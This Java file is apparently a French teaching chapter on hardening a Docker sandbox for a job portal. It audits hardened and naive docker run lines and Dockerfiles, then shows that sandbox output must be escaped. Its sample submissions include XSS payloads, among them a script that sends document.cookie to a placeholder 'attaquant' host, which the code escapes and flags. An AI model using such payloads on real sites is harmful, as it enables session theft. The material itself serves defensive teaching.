package fr.portail.chapitres;

import fr.portail.bac.AuditDurcissement;
import fr.portail.bac.AuditImage;
import fr.portail.bac.CommandeDocker;
import fr.portail.runner.DemandeExecution;
import fr.portail.runner.ExecutionEnBacASable;
import fr.portail.runner.Resultat;
import fr.portail.securite.Sortie;
import java.util.List;

/**
 * Chapitre 4 — Durcir : limites et moindre privilege.
 *
 * <pre>
 *   mvn -q compile exec:java -Dexec.mainClass=fr.portail.chapitres.Chapitre4Durcir
 * </pre>
 *
 * <p>Deux lignes {@code docker run} — celle du cours, et celle des
 * tutoriels — passees au meme audit. Puis l'IMAGE, lue sur le disque. Puis la
 * seconde moitie du chapitre, que l'on oublie : la SORTIE du bac a sable est
 * elle aussi une donnee hostile.
 *
 * <p>⚠️ Docker n'est pas lance ici, et ne peut pas l'etre : ce projet doit
 * tourner sans demon. Ce que les deux audits verifient est une
 * CONFIGURATION, pas un comportement — et c'est deja ce qui manque le plus
 * souvent.
 */
public final class Chapitre4Durcir {

    private Chapitre4Durcir() {
    }

    public static void main(String[] args) {
        System.out.println("""
                1. LA LIGNE DU COURS, ET CE QUE CHAQUE DRAPEAU FERME
                """);
        CommandeDocker durcie = CommandeDocker.durcie();
        System.out.println("   " + String.join(" \\\n      ",
                decouperPourLaLecture(durcie.argv())) + "\n");
        for (String ligne : AuditDurcissement.rendre(durcie)) {
            System.out.println("   " + ligne);
        }

        System.out.println("""

                   ⚠️ Et remarquez ce qui MANQUE a la fin de cette ligne : le
                   script. Il arrive sur l'entree standard du conteneur —
                   c'est a cela que sert `--interactive`. La forme qu'on voit
                   partout le concatene dans la commande :

                      docker run … runner:jobportal-script -c "<le code>"

                   Elle fonctionne, et elle publie le code du candidat dans
                   `ps`, dans `docker inspect` et dans les journaux du demon.
                   Sur un noeud partage, cela s'appelle archiver.
                """);

        System.out.println("""
                2. LA MESURE QUI TRANCHE : LA MEME LIGNE, SANS LES DRAPEAUX
                """);
        CommandeDocker naive = CommandeDocker.naive();
        System.out.printf("   %s%n%n",
                String.join(" ", naive.argvAvecLeScriptEnClair("<le code>")));
        for (String ligne : AuditDurcissement.rendre(naive)) {
            System.out.println("   " + ligne);
        }

        System.out.println("""

                   Elle fonctionne. Elle execute le code, rend la sortie, et
                   nettoie le conteneur. C'est ce qui la rend dangereuse :
                   rien n'echoue, rien n'avertit, et les dix portes restent
                   ouvertes jusqu'au jour ou quelqu'un les essaie.

                   ⚠️ Cet audit se met dans une integration continue en dix
                   lignes. Il ne teste pas que gVisor RESISTE — c'est un
                   controle de configuration, comme un linter. Mais l'oubli
                   est de tres loin le cas le plus frequent : un drapeau
                   retire « juste pour deboguer » un vendredi soir arrive en
                   production le lundi, et rien ne le signale.
                """);

        System.out.println("""
                3. L'IMAGE EST LA DERNIERE LIGNE DE DEFENSE
                """);
        String dockerfile = AuditImage.dockerfileDuProjet();
        System.out.println("   `deploiement/Dockerfile`, lu sur le disque :\n");
        for (String instruction : AuditImage.instructions(dockerfile)) {
            System.out.printf("      %s%n", tronquerPourLaColonne(instruction, 66));
        }
        System.out.println();
        for (String ligne : AuditImage.rendre(dockerfile)) {
            System.out.println("   " + ligne);
        }

        System.out.println("""

                   ⚠️ Ce n'est pas une illustration : l'audit lit LE FICHIER
                   livre dans ce depot. Retirez-en la ligne `USER`, relancez
                   ce chapitre — il le dit.
                """);

        System.out.println("   Et le meme audit sur l'image des tutoriels :\n");
        String naiveDockerfile = """
                FROM eclipse-temurin:25-jdk
                COPY . /app
                CMD java -cp /app fr.portail.bac.Executeur $SCRIPT
                """;
        for (String ligne : AuditImage.rendre(naiveDockerfile)) {
            System.out.println("   " + ligne);
        }

        System.out.println("""

                   ⚠️ `USER` est la ligne que l'on oublie, et c'est celle qui
                   compte le plus : sans elle, le code tourne en root DANS le
                   conteneur. Ce n'est pas le root de la machine — mais c'est
                   le point de depart de toute evasion, et cela annule
                   l'interet de `--cap-drop`.

                   La strategie est l'EMPILEMENT : image minimale non-root,
                   plus drapeaux d'isolation, plus gVisor, plus sortie
                   plafonnee et echappee. Aucune couche n'est suffisante ;
                   c'est leur superposition qui fait qu'une seule faille ne
                   suffit pas.
                """);

        System.out.println("""
                4. ET LA SORTIE DU BAC A SABLE EST HOSTILE, ELLE AUSSI
                """);
        ExecutionEnBacASable bac = new ExecutionEnBacASable(5, 48);
        List<String> soumissions = List.of(
                "ecrire <script>fetch('http://attaquant/'+document.cookie)</script>",
                "ecrire <img src=x onerror=alert(1)>",
                "ecrire ok");

        System.out.printf("   %-52s %-9s %s%n",
                          "SORTIE PRODUITE PAR LE CANDIDAT", "SUSPECTE", "APRES ECHAPPEMENT");
        for (String soumission : soumissions) {
            Resultat resultat = bac.lancer(DemandeExecution.script(soumission));
            String brut = resultat.sortie().strip();
            String affichable = Sortie.pourAffichage(brut);
            System.out.printf("   %-52s %-9s %s%n",
                    tronquerPourLaColonne(brut, 50),
                    Sortie.suspecte(brut) ? "⚠️ oui" : "non",
                    tronquerPourLaColonne(affichable, 40));
        }

        System.out.println("""

                   Le bac a sable a fait son travail : le code n'a rien lu,
                   rien ecrit, rien appele. Et pourtant la sortie qu'il rend
                   contient une attaque — parce que c'est le candidat qui
                   l'ecrit.

                   ⚠️ Trois gestes, et ils ne se remplacent pas :

                      • PLAFONNER — la taille est choisie par le candidat ;
                      • ECHAPPER avant tout affichage. Jamais de HTML brut,
                        jamais de `innerHTML`, jamais de `|raw` ;
                      • NE JAMAIS INTERPRETER. Ni SQL, ni expression, ni
                        modele.

                   Le troisieme est celui qu'on oublie. Concatener la sortie
                   dans une requete de notation, ou la passer a un moteur de
                   templates « pour formater joliment », rend au candidat
                   l'execution qu'on venait de lui retirer — et cette fois
                   dans le processus de l'application, celui qui a la base et
                   les secrets.
                """);
    }

    private static List<String> decouperPourLaLecture(List<String> argv) {
        return argv.stream()
                .map(morceau -> morceau.length() > 40
                        ? morceau.substring(0, 37) + "..." : morceau)
                .toList();
    }

    private static String tronquerPourLaColonne(String texte, int largeur) {
        String propre = texte.replace("\n", " ");
        return propre.length() <= largeur ? propre
                : propre.substring(0, largeur - 1) + "…";
    }
}
